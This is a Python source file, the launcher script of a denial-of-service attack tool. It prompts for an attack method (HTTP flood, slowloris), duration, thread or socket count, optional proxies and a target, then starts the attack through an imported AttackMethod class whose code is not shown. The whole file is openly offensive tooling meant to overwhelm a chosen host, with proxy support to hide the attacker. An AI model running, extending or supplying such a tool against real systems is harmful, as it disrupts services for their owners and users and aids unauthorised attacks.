"""Main script to start GUI DoS attack application."""

# -*- coding: utf-8 -*-
import os
import sys

from colorama import Fore  # type: ignore[import]

os.chdir(os.path.dirname(os.path.realpath(__file__)))
os.system("cls" if os.name == "nt" else "clear")

try:
    from tools.addons.checks import (  # type: ignore[import]
        check_method_input,
        check_number_input,
        check_proxy_input,
        check_target_input,
    )
    from tools.addons.logo import show_logo  # type: ignore[import]
    from tools.method import AttackMethod  # type: ignore[import]
except ImportError as err:
    from tools.crash import CriticalError  # type: ignore[import]

    CriticalError("Failed to import some packages", err)


def main() -> None:
    """Run main application."""
    show_logo()
    try:
        method = check_method_input()
        time = check_number_input("time")
        threads = check_number_input("threads" if method == "http" else "sockets")
        sleep_time = check_number_input("sleep time") if method == "slowloris" else 0
        use_proxy = check_proxy_input()
        target = check_target_input()

        with AttackMethod(
            duration=time,
            method_name=method,
            threads=threads,
            target=target,
            sleep_time=sleep_time,
            use_proxy=use_proxy,
        ) as attack:
            attack.start()
    except KeyboardInterrupt:
        print(
            f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.{Fore.RESET}"
        )
        sys.exit(1)


if __name__ == "__main__":
    main()
